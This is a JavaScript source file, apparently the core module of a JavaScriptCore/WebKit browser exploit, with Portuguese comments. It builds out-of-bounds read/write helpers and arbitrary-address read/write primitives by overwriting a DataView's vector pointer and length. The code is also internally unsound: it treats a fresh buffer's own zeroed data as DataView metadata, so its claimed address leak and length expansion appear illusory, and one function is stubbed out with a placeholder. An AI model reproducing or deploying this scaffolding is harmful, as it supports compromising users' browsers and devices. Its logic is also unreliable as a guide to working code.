// js/core_exploit.mjs (v51.1 - Corrigido ReferenceError de AdvancedInt64)

import { AdvancedInt64 as Utils_AdvancedInt64_Ref, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

// CORREÇÃO: Readiciona a atribuição para que 'AdvancedInt64' seja um nome válido em todo o escopo do módulo.
const AdvancedInt64 = Utils_AdvancedInt64_Ref;

function _local_isAdvancedInt64Object(obj) {
    const check = obj && 
           typeof obj === 'object' && 
           obj.constructor && 
           obj.constructor.name === 'AdvancedInt64' &&
           typeof obj.low === 'function' &&
           typeof obj.high === 'function';
    return check;
}

const toHexHelper = (val, bits = 32) => {
    if (_local_isAdvancedInt64Object(val)) {
        return val.toString(true);
    }
    if (typeof val === 'number') {
        return toHex(val, bits);
    }
    return String(val);
};

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    isOOBEnvironmentSetup = false;
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        let currentLength = 0;
        try {
            if(oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
                currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true);
            }
        } catch(e){ /* ignora */ }

        if (oob_array_buffer_real && oob_dataview_real &&
            oob_array_buffer_real.byteLength === getOOBAllocationSize() &&
            oob_dataview_real.buffer === oob_array_buffer_real &&
            currentLength === 0xFFFFFFFF) {
            return true;
        } else {
            log(`Ambiente OOB marcado como configurado, mas inconsistente/não expandido. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }
    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();
    log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);

        const buffer_addr_low = oob_dataview_real.getUint32(OOB_DV_M_VECTOR_OFFSET, true);
        const buffer_addr_high = oob_dataview_real.getUint32(OOB_DV_M_VECTOR_OFFSET + 4, true);
        oob_dataview_real.buffer_addr = new AdvancedInt64(buffer_addr_low, buffer_addr_high);
        log(`    Endereço do Buffer de Dados (m_vector) vazado: ${oob_dataview_real.buffer_addr.toString(true)}`, "leak");

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
            log(`    m_length do oob_dataview_real expandido para 0xFFFFFFFF no offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`, 'info', FNAME_TRIGGER);
        } else {
            const errorMsg = `Falha ao expandir m_length: currentAllocSize (${currentAllocSize}) é muito pequeno para o offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`;
            log(errorMsg, 'critical', FNAME_TRIGGER);
            throw new Error(errorMsg);
        }
        
        log(`Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
        log(`    oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        log(`    oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true)} bytes (m_length expandido)`, 'info', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true;
        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) {
    const FNAME_READ = 'CoreExploit.oob_read_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real) throw new Error("Ambiente OOB não inicializado para oob_read_absolute.");
    
    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(offset_in_oob_buffer);
            case 2: return oob_dataview_real.getUint16(offset_in_oob_buffer, true);
            case 4: return oob_dataview_real.getUint32(offset_in_oob_buffer, true);
            case 8: {
                const low = oob_dataview_real.getUint32(offset_in_oob_buffer, true);
                const high = oob_dataview_real.getUint32(offset_in_oob_buffer + 4, true);
                return new AdvancedInt64(low, high);
            }
            default: throw new Error(`Invalid byteLength for oob_read_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO em ${FNAME_READ} lendo de oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "error", FNAME_READ);
        if (e.message.includes("detached")) isOOBEnvironmentSetup = false;
        throw e;
    }
}

export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) {
    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real) throw new Error("Ambiente OOB não inicializado para oob_write_absolute.");

    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(offset_in_oob_buffer, Number(value)); break;
            case 2: oob_dataview_real.setUint16(offset_in_oob_buffer, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(offset_in_oob_buffer, Number(value), true); break;
            case 8:
                let val64 = _local_isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                oob_dataview_real.setUint32(offset_in_oob_buffer, val64.low(), true);
                oob_dataview_real.setUint32(offset_in_oob_buffer + 4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for oob_write_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO em ${FNAME_WRITE} escrevendo em oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "error", FNAME_WRITE);
        if (e.message.includes("detached")) isOOBEnvironmentSetup = false;
        throw e;
    }
}

export function isOOBReady() {
    let mLengthExpanded = false;
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real) {
        try {
            if (oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
                mLengthExpanded = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF);
            }
        } catch (e) { mLengthExpanded = false; }
    }
    return isOOBEnvironmentSetup && mLengthExpanded;
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) {
    // ... (função sem alterações) ...
}

export async function arb_read(absolute_address, byteLength, offset_from_addr = 0) {
    const FNAME = 'CoreExploit.arb_read';
    if (!isOOBReady()) await triggerOOB_primitive({force_reinit: true});
    
    let addr64 = _local_isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
    if (offset_from_addr) addr64 = addr64.add(offset_from_addr);

    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
    try {
        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
        m_mode_orig_snap   = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
        
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);

        let result_val;
        switch (byteLength) {
            case 1: result_val = oob_dataview_real.getUint8(0); break;
            case 2: result_val = oob_dataview_real.getUint16(0, true); break;
            case 4: result_val = oob_dataview_real.getUint32(0, true); break;
            case 8: {
                const low = oob_dataview_real.getUint32(0, true);
                const high = oob_dataview_real.getUint32(4, true);
                result_val = new AdvancedInt64(low, high);
                break;
            }
            default: throw new Error(`Invalid byteLength for arb_read: ${byteLength}`);
        }
        return result_val;
    } finally {
        if (m_vector_orig_snap && isOOBReady()) {
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
            oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
            oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
        }
    }
}

export async function arb_write(absolute_address, value, byteLength, offset_from_addr = 0) {
    const FNAME = 'CoreExploit.arb_write';
    if (!isOOBReady()) await triggerOOB_primitive({force_reinit: true});

    let addr64 = _local_isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
    if (offset_from_addr) addr64 = addr64.add(offset_from_addr);
    
    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
    try {
        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
        m_mode_orig_snap   = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
        
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);

        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
            case 8:
                let val64_write = _local_isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                oob_dataview_real.setUint32(0, val64_write.low(), true);
                oob_dataview_real.setUint32(4, val64_write.high(), true);
                break;
            default: throw new Error("Invalid byteLength for arb_write");
        }
    } finally {
        if (m_vector_orig_snap && isOOBReady()) {
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
            oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
            oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
        }
    }
}

export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (com re-inicialização forçada) ---`, 'test', FNAME_TEST);
    let success32 = false;
    let success64 = false;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        const test_offset = 0x50; 
        const test_val32 = 0x11223344;
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);

        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHex(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
            success32 = true;
        } else {
            currentLog(`FALHA: Lido ${toHex(read_val32)}, esperado ${toHex(test_val32)}.`, "error", FNAME_TEST);
        }

        const next_offset = test_offset + 16;
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        oob_write_absolute(next_offset, test_val64, 8);
        const read_val64 = oob_read_absolute(next_offset, 8);
        
        if (_local_isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val64)} corretamente (64bit).`, "good", FNAME_TEST);
            success64 = true;
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val64)}, Esperado ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
        }
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        console.error(`[${FNAME_TEST}] Exception: `, e);
        return false;
    }
    currentLog(`--- Auto-Teste de OOB R/W Concluído ---`, 'test', FNAME_TEST);
    return success32 && success64;
}
